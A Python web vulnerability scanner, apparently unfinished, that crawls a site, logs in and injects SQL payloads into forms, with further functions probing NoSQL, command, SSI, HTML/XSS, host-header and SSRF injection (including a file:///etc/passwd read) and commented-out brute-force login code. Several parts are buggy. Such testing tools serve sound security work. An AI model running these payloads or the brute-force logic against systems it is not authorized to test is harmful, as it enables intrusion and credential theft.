import platform
import ssl
import sys
from io import UnsupportedOperation

import requests
import urllib.parse
import urllib.request
from bs4 import BeautifulSoup
import argparse
import os
# import queue
# import socket
# import ssl
# from datetime import datetime
# from configparser import ConfigParser
# from tkinter import *
# from tkinter.ttk import *
# from tkinter.font import *
# import threading
# import ctypes
# import sys
import re
# import subprocess
# import shutil
# import webbrowser

firstCallSpider = 1

# try:
#     config_object = ConfigParser()
#     config_object.read("config/config.ini")
# except Exception as e:
#     print(e)
#
# port_set = set()
# server_set = set()
# comment_set = set()
# script_set = set()
#
# linux_servers = ["apache", "nginx", "caddy", "openlitespeed", "hiawatha"]
# windows_servers = ["IIS"]
# mixed_servers = ["nodejs", "lighttpd"]
# privilege_data = ["groupID=grp001&orderID=0001", "grpID=2&item=1", "grp=group1", "role=5"]
#
# sql_injection_dict_normal = {}
# sql_injection_dict_injected = {}
# nosql_injection_dict_normal = {}
# nosql_injection_dict_injected = {}
#
# links_potential_role_definition = []
# links_vulnerable_to_lfi = []
# links_without_secure_cookie_with_sessid = []
# links_browser_cache_weakness = []
# links_lfi_directory_transversal = []
# links_cookie_directory_transversal = []
# links_bypass_authorization = []
# links_special_header = []
# links_xee_vuln = []
# links_xss_link = []
# links_privilege_escal = []
# links_idor = []
# links_javascript_code = []
# links_html_injection = []
# links_host_header_injection = []
# links_ssrf_injection = []
#
# links_forms_dict_xss = {}
# links_forms_dict_file_upload = {}
# links_forms_dict_code_exec = {}
# links_forms_dict_sql_injection = {}
# links_forms_dict_nosql_injection = {}
# links_forms__dict_sensitive_info = {}
# links_forms_files_in_form = {}
# links_forms_dict_ssi_injection = {}
# final_list = []
#
# session_id = ""
# prev_session_id = ""
#
# dtd_url = []
# temp_dir = None
#
# stable_directory = os.getcwd()

### asd
# class OtherUser:
#     def __init__(self, user, password, url=None, err_file=None):
#         try:
#             self.error_file = err_file
#             self.url = url
#             self.session = requests.Session()
#             self.http = self.session.post(
#                 config_object["WEBURL"]["login"],
#                 data={
#                     config_object["CREDENTIAL"]["username_field"]: user,
#                     config_object["CREDENTIAL"]["password_field"]: password,
#                     config_object["CREDENTIAL"]["login_field"]: config_object["CREDENTIAL"]["submit_field"]
#                 }
#             )
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when trying to establish another session. Error: ", e, file=self.error_file)
#             print("[Error Info] LINK:", self.url, file=self.error_file)
#             pass
#
#     def save_cookies(self, url):
#         try:
#             self.session.get(url)
#             session_cookies = self.session.cookies
#             cookies_dictionary = session_cookies.get_dict()
#             return cookies_dictionary
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when trying to return cookies from another session. Error: ", e, file=self.error_file)
#             print("[Error Info] LINK:", url, file=self.error_file)
#             pass
#
#     def get_sess_id(self):
#         try:
#             global session_id
#             self.session.get(self.url)
#             cookie_dict = self.save_cookies(self.url)
#             key_list = list(cookie_dict.keys())
#             for key in key_list:
#                 if key.lower() == "sid" or "sessionid" or "session" or "sessiontoken" or "sessid":
#                     session_id = cookie_dict[key]
#                     self.session.close()
#                     return session_id
#             return
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when trying to get session id from another session. Error: ", e, file=self.error_file)
#             pass
#
#
# class LoginTests:
#     def __init__(self, user, login_url, pass_file, wrong_username, good_password, certain_wrong_passwd, logout_url, file_for_report, error_file):
#         try:
#             self.error_file = error_file
#             self.report_file = file_for_report
#             self.username = user
#             self.password_found = False
#             self.login_url = login_url
#             self.logged_in = False
#             self.pass_file = pass_file
#             self.password = None
#             self.wrong_un = wrong_username
#             self.wrong_passwords = certain_wrong_passwd
#             self.credentials_error_vuln = False
#             self.good_password = good_password
#             self.session = requests.session()
#             self.logout_url = logout_url
#
#             self.test_lockout()
#             self.test_account_enum()
#             self.test_brute_force()
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when initializing login tests. Error: ", e, file=self.error_file)
#             pass
#
#     def brute_force(self):
#         try:
#             try:
#                 my_gui.update_list_gui("Trying BruteForcing Login")
#             except Exception:
#                 pass
#             with open(config_object["FILE"]["password_dict"], "rb") as f:
#                 pass_list = f.readlines()
#                 f.close()
#             pass_q = queue.Queue()
#             if len(pass_list):
#                 for passwd in pass_list:
#                     try:
#                         passwd = passwd.decode("utf-8").rstrip()
#                         pass_q.put(passwd)
#                     except Exception as e:
#                         print(e)
#                         passwd = passwd.decode("latin-1").rstrip()
#                         pass_q.put(passwd)
#
#             for pass_word in pass_q.queue:
#                 http = requests.post(
#                     self.login_url,
#                     data={
#                         config_object["CREDENTIAL"]["username_field"]: self.username,
#                         config_object["CREDENTIAL"]["password_field"]: pass_word,
#                         config_object["CREDENTIAL"]["login_field"]: config_object["CREDENTIAL"]["submit_field"]
#                     }
#                 )
#                 if http.url == config_object["WEBURL"]["index"]:
#                     self.password = pass_word
#                     self.password_found = True
#                     return 1
#             return 0
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when trying brute force tests. Error: ", e, file=self.error_file)
#             print("[Error Info] Login LINK:", self.login_url, file=self.error_file)
#             pass
#
#     def account_enumeration(self):
#         try:
#             try:
#                 my_gui.update_list_gui("Trying to enumerate accounts")
#             except Exception:
#                 pass
#             print("Checking for Account Enumeration and Possible Guessable Users...", file=self.report_file)
#             wrong_password_res = requests.post(
#                 self.login_url,
#                 data={
#                     config_object["CREDENTIAL"]["username_field"]: self.username,
#                     config_object["CREDENTIAL"]["password_field"]: self.wrong_passwords,
#                     config_object["CREDENTIAL"]["login_field"]: config_object["CREDENTIAL"]["submit_field"]
#                 }
#             )
#             wrong_password_res_content = str(wrong_password_res.content)
#             wrong_username_res = requests.post(
#                 self.login_url,
#                 data={
#                     config_object["CREDENTIAL"]["username_field"]: self.wrong_un,
#                     config_object["CREDENTIAL"]["password_field"]: self.good_password,
#                     config_object["CREDENTIAL"]["login_field"]: config_object["CREDENTIAL"]["submit_field"]
#                 }
#             )
#             wrong_username_req_content = str(wrong_username_res.content)
#             if wrong_username_req_content != wrong_password_res_content:
#                 return 1
#             return 0
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when checking for account enumeration. Error: ", e, file=self.error_file)
#             print("[Error Info] Login LINK:", self.login_url, file=self.error_file)
#             pass
#
#     def get_correct_password(self):
#         try:
#             if self.password_found:
#                 return self.password
#             return False
#         except Exception:
#             pass
#
#     def check_login_attempts(self, n):
#         try:
#             try:
#                 my_gui.update_list_gui("Checking Lock-Out Mechanism")
#             except Exception:
#                 pass
#             self.session = requests.session()
#             for i in range(n):
#                 self.session.post(
#                     self.login_url,
#                     data={
#                         config_object["CREDENTIAL"]["username_field"]: self.username,
#                         config_object["CREDENTIAL"]["password_field"]: self.wrong_passwords[0],
#                         config_object["CREDENTIAL"]["login_field"]: config_object["CREDENTIAL"]["submit_field"]
#                     }
#                 )
#             correct_login = self.session.post(
#                 self.login_url,
#                 data={
#                     config_object["CREDENTIAL"]["username_field"]: self.username,
#                     config_object["CREDENTIAL"]["password_field"]: self.good_password,
#                     config_object["CREDENTIAL"]["login_field"]: config_object["CREDENTIAL"]["submit_field"]
#                 }
#             )
#             if correct_login.url == config_object["WEBURL"]["index"]:
#                 self.session.post(self.logout_url)
#                 self.session.close()
#                 print("[!!!-!!!] Wrong Password Lock Out Mechanism not triggered after ", n, " times", file=self.report_file)
#                 return 1
#             return 0
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when checking for wrong pw lock-out. Error: ", e, file=self.error_file)
#             print("[Error Info] Login LINK:", self.login_url, file=self.error_file)
#             pass
#
#     def test_lockout(self):
#         try:
#             try:
#                 my_gui.update_list_gui("Testing Lock-Out Mechanism")
#             except Exception:
#                 pass
#             if self.check_login_attempts(int(config_object["TEST"]["lock_out_mechanism_attempts"])):
#                 print("[!!!-!!!] Weak Lockout Mechanism found for a number of invalid password attempts", file=self.report_file)
#             else:
#                 print("OK! Wrong Password Lock Out Mechanism detected", file=self.report_file)
#             return
#         except Exception:
#             pass
#
#     def test_account_enum(self):
#         try:
#             if self.account_enumeration():
#                 print(
#                     "[!!!-!!!] It s possible that the login error message provides useful information about login credentials!"
#                     " Make sure the error message is the same for any invalid credentials case!",  file=self.report_file
#                 )
#             else:
#                 print("OK! No accounts can be enumerated", file=self.report_file)
#             return
#         except Exception:
#             pass
#
#     def test_brute_force(self):
#         try:
#             if self.brute_force():
#                 print("[!!!---!!!] Brute Force attack successful!!" + "\nUsername: " + self.username + "\n" + "Found password: " + self.password, file=self.report_file)
#                 print("\t\t[END LOGIN REPORT]", file=self.report_file)
#             return
#         except Exception:
#             pass


class DataStorage:
    def __init__(self):
        self.urls = []
        self.related_domains = []
        self.sql_dict = {}

    # https://github.com/payloadbox/sql-injection-payload-list
    def payloads(self, p_type): # returns a list of payloads depending on the chosen type
        try:
            if p_type == 'SQL':
                for filename in os.listdir(os.getcwd() + '/Payloads/SQL'):
                    with open(os.path.join(os.getcwd() + '/Payloads/SQL', filename), 'r') as f:
                        self.sql_dict[filename.split('.')[0]] = f.read().splitlines()
                f.close()
                all_sql_values = []
                for value in self.sql_dict.values():
                    if isinstance(value, list):
                        all_sql_values.extend(value)
                    else:
                        all_sql_values.append(value)
                return all_sql_values
        except Exception as e:
            print("\n[ERROR] Something went wrong. Payload files cannot be read", e)
            pass

    def inject_type(self, p_type):
        for key, value in self.sql_dict.items():
            if isinstance(value, list) and p_type in value:
                return key
        return None


class ScanConfigParameters:

    def __init__(self, url, ignored_links_path):

        try:
            self.url = url
            self.session = requests.Session()  # Session for current run
            self.DataStorage = DataStorage()
            # Test connection
            try:
                self.session.get(self.url)
            except requests.ConnectionError as e:
                try:
                    self.url = self.url.replace("https://", "http://") # Change to HTTP if HTTPs unsupported
                except requests.ConnectionError:
                    self.url = self.url.replace("http://", "https://")  # Change to HTTPs if HTTP unsupported
                except Exception as e:
                    print("[ERROR] Something went establishing HTTP session. Error: ", e)
                    quit()

            try:  # Tries to read an exiting error file, create one is none is found.
                self.err_file = open('err_file.log', 'a')
                if os.stat('err_file.log').st_size == 0:
                    self.err_file.write("Error File\n")  # check if file is empty before writing
            except Exception:
                print("Something went wrong when opening the Error File")
                self.session.close()
                quit()

            try:  # Try to read an existing link Ignore file, create one if none is found.
                self.ignored_links = open(ignored_links_path + '/linkignore.log', 'r')
                if os.stat(ignored_links_path + '/linkignore.log').st_size == 0:
                    self.ignored_links.write("www.exampleurl.com") # check if file is empty before writing
                self.ignored_links = self.ignored_links.read()
            except Exception as e:
                print("Something went wrong when opening the Ignored Links file. Please check Error File")
                print("\n[ERROR] Something went opening the Ignored Links file. Error: ", e,
                      file=self.err_file)  # Writes Errors to File.
                print("[Error Info] URL:", self.url, file=self.err_file)
                self.session.close()
                quit()

        except Exception as e:
            print("Something went wrong. Please check error file", e)
            print("\n[ERROR] Something went wrong when initializing tests. Error: ", e, file=self.err_file)  # Write
            # Errors to File.
            print("[Error Info] URL:", self.url, file=self.err_file)
            quit()


class Utilities(ScanConfigParameters):

    def __init__(self, url, ignored_links_path, username=None, password=None):  # Inherits Parameters from Config Class
        ScanConfigParameters.__init__(self, url, ignored_links_path)

    def do_login(self, username, password):
        if username and password:
            if self.extract_login_form(self.session.get(self.url).url, username, password):
                print("Login Successful")
                return True
            else:
                print("Login Failed. Make sure you provided the right credentials.")
                quit()

    def extract_login_form(self, url, username, password):
        login_form = self.extract_forms(url)
        # login_data = {
        #     "login": username,
        #     "password": password,
        #     'form': 'submit'
        # }
        for l_form in login_form:
            login_data_new = self.extract_form_details(l_form)
            for idx, (key, value) in enumerate(login_data_new.items()):
                if login_data_new[key]:
                    continue
                else:
                    if idx == 0:
                        login_data_new[key] = username
                    elif idx == 1:
                        login_data_new[key] = password
            login_response = self.submit_form(url, l_form, login_data_new)
            if login_response.url != url:
                return True
        return False

    def extract_form_details(self, form):
        input_fields = form.find_all('input')
        form_data = {}
        for field in input_fields:
            if field.get('name'):
                form_data[field.get('name')] = field.get('value', '')
        form_fields = form.find_all('button')
        for field in form_fields:
            if field.get('name'):
                form_data[field.get('name')] = field.get('value', 'submit')
        return form_data

    def spider(self, url):

        try:
            global firstCallSpider
            if firstCallSpider:
                response = self.session.get(url)  #Gets response of user given URL (SQLi 10 -1)
                self.DataStorage.urls.append(url)
                firstCallSpider = 0
            else:
                response = self.session.get(url)  # Gets Response of URL.

            if response.status_code == 200:  # If 200, then endpoint is accessible
                soup = BeautifulSoup(response.text, "html.parser")

                for link in soup.find_all('a'):  # Build up URls
                    href = link.get('href')
                    if href and not href.startswith('#'):
                        extracted_url = urllib.parse.urljoin(url, href)
                        #ensure the app does not scan public internet/other domains
                        if re.search("^(?:https?:\/\/)?(?:[^@\/\n]+@)?(?:www\.)?([^:\/?\n]+)", extracted_url).group(1) == re.search("^(?:https?:\/\/)?(?:[^@\/\n]+@)?(?:www\.)?([^:\/?\n]+)", self.url).group(1):
                            if extracted_url not in self.DataStorage.urls and extracted_url not in self.ignored_links:
                                self.DataStorage.urls.append(extracted_url)
                                self.spider(extracted_url)
                        else: # build additional interesting URL from different domains list 1 step
                            self.DataStorage.related_domains.append(extracted_url)
            if response.status_code != 200 and response.status_code != 404 and response.status_code != 500:  # If
                # it's not 200 and not 4XX, means that there are some ways of accessing the URL
                # Create site map.
                pass
            return
        except Exception as e:  # Add Colors to errors
            print("Something went wrong. Please check error file.")
            print("\n[ERROR] Something went wrong when crawling for links. Error: ", e, file=self.err_file)
            print("[Error Info] LINK:", url, file=self.err_file)
            pass

    def get_headers(self, url):

        try:
            return self.session.get(url).headers
        except Exception as e:  # Refine errors
            print("Something went wrong. Please check error file.")
            print("\n[ERROR] Something went wrong when getting the headers. Error: ", e, file=self.err_file)
            print("[Error Info] LINK:", url, file=self.err_file)
            pass

    def extract_forms(self, url):

        try:
            response = self.session.get(url)
            response.raise_for_status()
            parsed_html = BeautifulSoup(response.content, "html.parser")#, from_encoding="iso-8859-1")
            return parsed_html.findAll("form")
        except requests.HTTPError as e:
            print("Something went wrong. A HTTP error occurred. Please check error file.")
            print("\n[ERROR] Something went wrong when extracting forms from links. Error: ", e, file=self.err_file)
            print("[Error Info] LINK:", url, file=self.err_file)
        except Exception as e:
            print("Something went wrong. Please check error file.")
            print("\n[ERROR] Something went wrong when extracting forms from links. Error: ", e, file=self.err_file)
            print("[Error Info] LINK:", url, file=self.err_file)
            pass

    def submit_form(self, url, form, form_data):

        try:
            action = form.get("action")
            method = form.get("method").upper()  # GET, POST, PUT etc..
            if action.startswith('http'):
                action_url = action
            else:
                action_url = urllib.parse.urljoin(url, action)

            if method == 'GET':
                response = self.session.get(action_url, params=form_data)
            else:
                response = self.session.post(action_url, data=form_data)
            response.raise_for_status()
            return response
        except requests.HTTPError as e:
            print("Something went wrong. A HTTP error occurred. Please check error file.")
            print("\n[ERROR] Something went wrong when extracting forms from links. Error: ", e, file=self.err_file)
            print("[Error Info] LINK:", url, file=self.err_file)
        except Exception as e:
            print("\n[ERROR] Something went wrong when submitting the form. Error: ", e, file=self.err_file)
            print("[Error Info] FORM:", form, file=self.err_file)
            print("[Error Info] LINK:", url, file=self.err_file)
            pass


class Scanner(Utilities):  # Scanner class handles scan jobs
    def __init__(self, url, ignored_links_path, username=None, password=None, static_scan=None, comprehensive_scan=None):
        self.Utils = Utilities.__init__(self, url, ignored_links_path, username, password)
        # Build URL list
        self.comprehensive_scan = comprehensive_scan
        print(self.comprehensive_scan)
        self.check_scan_build_url(url, username, password, static_scan)
        self.scan()

    def scan(self):
        #print(self.DataStorage.urls)
        for url in self.DataStorage.urls:
            # Call all functions for tests for each URL. ignore links ignored in file
            if url in self.ignored_links:
                continue
            for form in self.extract_forms(url):
                form_data = self.extract_form_details(form)
                # Ignore page default forms
                if any([True for key, value in form_data.items() if key == 'form_security_level' or key =='form_bug']):
                    continue
                sql_vuln, sql_type, sql_conf = self.t_i_sql(url, form, form_data)
                if sql_vuln:
                    print("URL: ", url, "\nFORM: ", form, "\nVulnerability: ", sql_type, "Confidence", sql_conf)
                    if sql_conf == 10:
                        print("Multiple other SQL Vulnerabilities suspected, reached max Confidence, use --comprehensive_scan option for comprehensive scan")

    def check_scan_build_url(self, url, username=None, password=None, static_scan=None):
        # Full scan required
        if static_scan is None:
            if self.session.get(url).url != url or "login" in self.session.get(url).url:
                # if username or password not provided, throw eer
                if not (username and password):
                    print("You need to provide login credentials first, check --help for details!")
                    quit()
                elif self.do_login(username, password):
                    self.spider(url)  # Scan first time for URL provided by Main, then continue with others.
            else:
                self.spider(url)

        # Static Scan required
        else:
            if self.session.get(url).url != url or "login" in self.session.get(url).url:
                # if username or password not provided, throw eer
                if not (username and password):
                    print("You need to provide login credentials first, check --help for details!")
                    quit()
                elif self.do_login(username, password):
                    self.DataStorage.urls.append(url)

    def t_i_sql(self, url, form, form_data):
        try:
            # Initialize default Confidence for forms/URLs and SQL types list
            confidence = 0
            sql_type_list = set()
            # Get Initial ~ normal response time with no Payload
            response_time_wo_1 = self.submit_form(url, form, "").elapsed.total_seconds()
            response_time_wo_2 = self.submit_form(url, form, "").elapsed.total_seconds()
            response_time_wo_3 = self.submit_form(url, form, "").elapsed.total_seconds()

            # Create average response time
            avg_response_time = (response_time_wo_1 + response_time_wo_2 + response_time_wo_3)/3
            payload_key = [elem for elem in form_data.values()][0]
            for sql_payload in self.DataStorage.payloads("SQL"):
                for key, value in form_data.items():
                    if form_data[key]:
                        continue
                    else:
                        payload_key = key

                form_data[payload_key] = sql_payload
                response_injected = self.submit_form(url, form, form_data)
                payload_response_time = response_injected.elapsed.total_seconds()

                if payload_response_time > avg_response_time and payload_response_time > 4:
                    # Vulnerable to Time based SQL type X, increase confidence
                    confidence += 1
                    sql_type_list.add(self.DataStorage.inject_type(sql_payload))
                    continue

                if "error" in response_injected.text:  # Create other conditions of detection
                    confidence += 1
                    sql_type_list.add(self.DataStorage.inject_type(sql_payload))
                if confidence == 10:
                    if self.comprehensive_scan is False:
                        return True, sql_type_list, confidence
                    else:
                        pass
            # Code unreachable wtf
            print(confidence)
            if confidence != 0:
                print("HERE")
                print(sql_type_list, confidence)
                return True, sql_type_list, confidence
            else:
                print("ELSEWHERE")
                return False, sql_type_list, confidence
        except Exception as e:
            print("\n[ERROR] Something went wrong when testing for SQL Injection. Error: ", e, file=self.err_file)
            print("[Error Info] FORM:", form, file=self.err_file)
            print("[Error Info] LINK:", url, file=self.err_file)
            pass

    def test_nosql(self, form, url):  # Add more payloads
        try:
            try:
                my_gui.update_list_gui("Testing for NOSQL Injection")
            except Exception:
                pass
            global nosql_injection_dict_normal, nosql_injection_dict_injected
            no_nosql_payload = ""
            response_wh_payload = self.submit_form(form, no_nosql_payload, url)
            normal_response_time = response_wh_payload.elapsed.total_seconds()
            nosql_detect_payload = "';sleep(5000); ';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);"  # https://www.objectrocket.com/blog/mongodb/code-injection-in-mongodb/
            response_w_payload = self.submit_form(form, nosql_detect_payload, url)
            nosql_response_time = response_w_payload.elapsed.total_seconds()

            if nosql_response_time > normal_response_time and nosql_response_time > 1:
                nosql_injection_dict_normal[url] = normal_response_time
                nosql_injection_dict_injected[url] = nosql_response_time
                return True
            return False
        except Exception as e:
            print("\n[ERROR] Something went wrong when testing for NOSQL Injection. Error: ", e, file=self.error_file)
            print("[Error Info] FORM:", form, file=self.error_file)
            print("[Error Info] LINK:", url, file=self.error_file)
            pass

    def code_exec(self, form, url):  # Add more payloads
        try:
            try:
                my_gui.update_list_gui("Testing for Code Execution")
            except Exception:
                pass
            code_exec_script = "| uptime"  # echo
            response = self.submit_form(form, code_exec_script, url)
            return re.findall('\d\d:\d\d:\d\d', str(response.content))
        except Exception as e:
            print("\n[ERROR] Something went wrong when testing for Code Execution Injection. Error: ", e,
                  file=self.error_file)
            print("[Error Info] FORM:", form, file=self.error_file)
            print("[Error Info] LINK:", url, file=self.error_file)
            pass

    def javascript_exec(self, url):  # Add more payloads
        try:
            try:
                my_gui.update_list_gui("Testing for JS Code Execution")
            except Exception:
                pass
            js_payload = '/?javascript:alert(testedforjavascriptcodeexecutionrn3284)'
            if url[-1] != '/':
                new_url = url + js_payload
            else:
                new_url = url + js_payload[1:]
            response = self.session.get(new_url)
            return 'alert(testedforjavascriptcodeexecutionrn3284)' in str(response.text).lower()
        except Exception as e:
            print("\n[ERROR] Something went wrong when testing Javascript code execution. Error: ", e,
                  file=self.error_file)
            print("[Error Info] LINK:", url, file=self.error_file)
            pass

    def html_injection(self, url):  # Add more payloads
        try:
            try:
                my_gui.update_list_gui("Testing for HTML Injection")
            except Exception:
                pass
            html_payload = "=<img%20src='aaa'%20onerror=alert('testforhtmlinjectionra872347')>"
            url = url.replace('=', html_payload)
            response = self.session.get(url)
            return 'alert(testforhtmlinjectionra872347)' in str(response.text).lower()
        except Exception as e:
            print("\n[ERROR] Something went wrong when testing HTML Injection. Error: ", e, file=self.error_file)
            print("[Error Info] LINK:", url, file=self.error_file)
            pass

    def ssi_injection(self, form, url):  # Add more payloads
        try:
            try:
                my_gui.update_list_gui("Testing for SSI Injection")
            except Exception:
                pass
            ssi_payload = '<!--#exec cmd="| uptime" -->'
            response = self.submit_form(form, ssi_payload, url)
            return re.findall('\d\d:\d\d:\d\d', str(response.content))
        except Exception as e:
            print("\n[ERROR] Something went wrong when testing SSI Injection. Error: ", e, file=self.error_file)
            print("[Error Info] FORM:", form, file=self.error_file)
            print("[Error Info] LINK:", url, file=self.error_file)
            pass

    def host_header_injection(self, url):
        try:
            try:
                my_gui.update_list_gui("Testing for HH Injection")
            except Exception:
                pass
            host = {'Host': 'www.google.com'}
            x_host = {'X-Forwarded-Host': 'www.google.com'}
            if self.session.get(url, headers=host).status_code == 200:
                return True
            elif self.session.get(url, headers=x_host).status_code == 200:
                return True
            return False
        except Exception as e:
            print("\n[ERROR] Something went wrong when testing Host Header Injection. Error: ", e, file=self.error_file)
            print("[Error Info] LINK:", url, file=self.error_file)
            pass

    def ssrf_injection(self, url):  # Add more payloads
        try:
            try:
                my_gui.update_list_gui("Testing for SSRF Injection")
            except Exception:
                pass
            ssrf_payload = "=https://www.google.com/"
            url = url.replace('=', ssrf_payload)
            response = self.session.get(url)
            if response.status_code == 200:
                return True
            ssrf_payload = '=file:///etc/passwd'
            url = url.replace('=', ssrf_payload)
            if "root:" in self.get_content(url).text.lower():
                return True
            return False
        except Exception as e:
            print("\n[ERROR] Something went wrong when testing Server Side Request Forgery. Error: ", e,
                  file=self.error_file)
            print("[Error Info] LINK:", url, file=self.error_file)
            pass


    #
    # def check_response(self, url):
    #     try:
    #         if self.session.post(url).status_code == 200:
    #             return True
    #         elif self.session.get(url).status_code == 200:
    #             return True
    #         elif str(self.session.get(url).status_code).startswith("3"):
    #             return True
    #         return False
    #     except Exception as e:
    #         if "toomanyredirects" in str(e).lower():
    #             print("\n[WARN] Got too many redirects from an URL. This can be ignored.", file=self.error_file)
    #             print("[Error Info] LINK:", url, file=self.error_file)
    #             pass
    #         return False
    #

    #
    # def save_cookies(self, url, session=None):
    #     try:
    #         if session is None:
    #             self.session.get(url)
    #             session_cookies = self.session.cookies
    #         else:
    #             session_cookies = session.cookies
    #         cookies_dictionary = session_cookies.get_dict()
    #         return cookies_dictionary
    #     except Exception as e:
    #         print("\n[ERROR] Something went wrong when saving cookies. Error: ", e, file=self.error_file)
    #         print("[Error Info] LINK:", url, file=self.error_file)
    #         pass
    #
    # def check_hidden_path(self, h_path):
    #     try:
    #         try:
    #             my_gui.update_list_gui("Searching for hidden paths")
    #         except Exception:
    #             pass
    #         response = self.session.get(self.target_url + h_path)
    #         if response == 200:
    #             return True
    #         return False
    #     except Exception as e:
    #         print("\n[ERROR] Something went wrong when checking hidden paths. Error: ", e, file=self.error_file)
    #         print("[Error Info]  Hidden Path:", h_path, file=self.error_file)
    #         pass
    #

    #
    # def get_content(self, url, sess=None):
    #     try:
    #         if sess is None:
    #             response = self.session.get(url)
    #         else:
    #             response = sess.get(url)
    #         return response
    #     except Exception as e:
    #         print("\n[ERROR] Something went wrong when parsing content from link. Error: ", e, file=self.error_file)
    #         print("[Error Info] LINK:", url, file=self.error_file)
    #         pass
    #
    # # Get Info
    # def fingerprint(self, url):
    #     try:
    #         try:
    #             my_gui.update_list_gui("Fingerprinting application")
    #         except Exception:
    #             pass
    #         global server_set
    #         header_for_link = self.get_headers(url)
    #         server_set.add(header_for_link["Server"])
    #         return
    #     except Exception as e:
    #         print("\n[ERROR] Something went wrong when searching for application server. Error: ", e, file=self.error_file)
    #         print("[Error Info] LINK:", url, file=self.error_file)
    #         pass
    #
    # def get_port(self):
    #     # Get PORTS
    #
    # def get_port_info(self):
    #     #Get PORTS and INFO
    #
    # def get_comments_dtds_scripts_from_content(self, url):
    #     try:
    #         try:
    #             my_gui.update_list_gui("Trying to get comments and scripts from source")
    #         except Exception:
    #             pass
    #         global comment_set, dtd_url
    #         content = self.session.get(url)
    #         comments = re.findall('(?<=<!--)(.*)(?=-->)', str(content.text))
    #         if 'strict.dtd' in str(content.text).lower() or 'loose.dtd' in str(content.text).lower() or 'frameset.dtd' in str(content.text).lower():
    #             dtd_url.append(url)
    #         if comments:
    #             comments_list = [comm for comm in comments if comm]
    #             for comm in comments_list:
    #                 comment_set.add(comm)
    #         js_inside_html = re.findall('(?<=<script>)(.*)(?=</script>)', str(content.text).lower())
    #         if js_inside_html:
    #             js_code_list = [code for code in js_inside_html if code]
    #             for js_code in js_code_list:
    #                 script_set.add(js_code)
    #         return
    #     except Exception as e:
    #         print("\n[ERROR] Something went wrong when trying to get comments from DOM. Error: ", e, file=self.error_file)
    #         print("[Error Info] LINK:", url, file=self.error_file)
    #         pass

#     # Vulnerabilities
#
#     # A2:2017-Broken Authentication:
#     # Above Class(LoginTestsVulns)
#
#     def test_role_definition_cookie(self, url):
#         try:
#             try:
#                 my_gui.update_list_gui("Testing for Role Definition Cookies")
#             except Exception:
#                 pass
#             cookie_dict = self.save_cookies(url)
#             if "isadmin" in str(cookie_dict).lower():
#                 if str(cookie_dict.lower()["isAdmin"]).lower() == "true" or\
#                         str(cookie_dict.lower()["isAdministrator"]).lower() == "true" or\
#                         str(cookie_dict.lower()["admin"]).lower() == "true" or\
#                         str(cookie_dict.lower()["administrator"]).lower() == "true":
#                     return 1
#             if "role" in str(cookie_dict).lower():
#
#                 if str(cookie_dict.lower()["role"]).lower() == "admin" or\
#                         str(cookie_dict.lower()["role"]).lower() == "administrator" or\
#                         str(cookie_dict.lower()["role"]).lower() == "manager" or\
#                         str(cookie_dict.lower()["role"]).lower() == "auditor" or\
#                         str(cookie_dict.lower()["role"]).lower() == "mod":
#                     return 1
#             return 0
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when testing for role definition on cookies. Error: ", e, file=self.error_file)
#             print("[Error Info] LINK:", url, file=self.error_file)
#             pass
#
#     def search_paths(self):
#         try:
#             with open(config_object["FILE"]["hidden_url_dict"], "r") as file:
#                 paths = file.read().split("\n")
#                 file.close()
#             for hidden_path in paths:
#                 if self.target_url + hidden_path not in self.visited and\
#                         self.target_url + hidden_path not in self.ignored_links and\
#                         self.target_url + hidden_path not in self.target_links and\
#                         "logout" not in self.target_url + hidden_path and\
#                         len(self.visited) <= int(config_object['TEST']['max_number_of_hidden_links']):
#                     response = self.session.get(self.target_url + hidden_path)
#                     if response.status_code == 200:
#                         link_visited = self.target_url + hidden_path
#                         self.visited.append(str(link_visited))
#             if self.visited:
#                 return 1
#             return 0
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when searching for paths. Error: ", e, file=self.error_file)
#             pass
#
#     def test_role_definition_directories(self):
#         try:
#             try:
#                 my_gui.update_list_gui("Testing for Role Definition Directories")
#             except Exception:
#                 pass
#             hidden_dir = []
#             for link in self.visited+self.target_links:
#                 link = link.lower()
#                 if "/admin" in link or "/administrator" in link or "/mod" in link or "/moderator" in link:
#                     hidden_dir.append(link)
#             if hidden_dir:
#                 return hidden_dir
#             return 0
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when testing for role definition directories. Error: ", e, file=self.error_file)
#             pass
#
#     def check_session_url(self, url):
#         try:
#             try:
#                 my_gui.update_list_gui("Checking Session URL")
#             except Exception:
#                 pass
#             cookie_dict = self.save_cookies(url)
#             if "sid=" or "sessionid=" in str(url).lower():
#                 print("\n[?????-!!!!!]Possible SessionID Hijacking for link:" + url, file=self.report_file)
#                 print("\nSearching for proper SessionID storage on cookies...", file=self.report_file)
#                 if "sid" or "sessionid" or "session" or "sessiontoken" or "sessid" in str(cookie_dict).lower():
#                     if not str(cookie_dict.lower()["secure"]) or str(cookie_dict.lower()["httpOnly"]):
#                         print("\n[!!!-!!!]Cookie Session not secure...(HTTP only)", file=self.report_file)
#                         return True
#             return False
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when checking presence of session. Error: ", e, file=self.error_file)
#             print("[Error Info] LINK:", url, file=self.error_file)
#             pass
#
#     def check_session_id(self, url):
#         try:
#             try:
#                 my_gui.update_list_gui("Checking Session ID")
#             except Exception:
#                 pass
#             global session_id, prev_session_id
#             if "sid=" in str(url).lower():
#                 session_id = url.split("sid=", 1)[1]
#             elif "sessionid=" in str(url).lower():
#                 session_id = url.split("sessionid=", 1)[1]
#
#             if session_id != prev_session_id:
#                 if self.check_session_url(url):
#                     prev_session_id = session_id
#                     return True
#             return False
#         except Exception as e:
#             print("\n[ERROR] Something went wrong when checking session ID. Error: ", e, file=self.error_file)
#             print("[Error Info] LINK:", url, file=self.error_file)
#             pass
#
#     def test_browser_cache_weakness(self, url):
#         try:
#             try:
#                 my_gui.update_list_gui("Testing for browser cache misconfiguration")
#             except Exception:
#                 pass
#             response = self.session.get(url)
#             if "Cache-Control" in str(response.headers):
#                 if (response.headers["Cache-Control"] != "no-store" and
#                     response.headers["Cache-Control"] == "no-cache, must-revalidate") or\
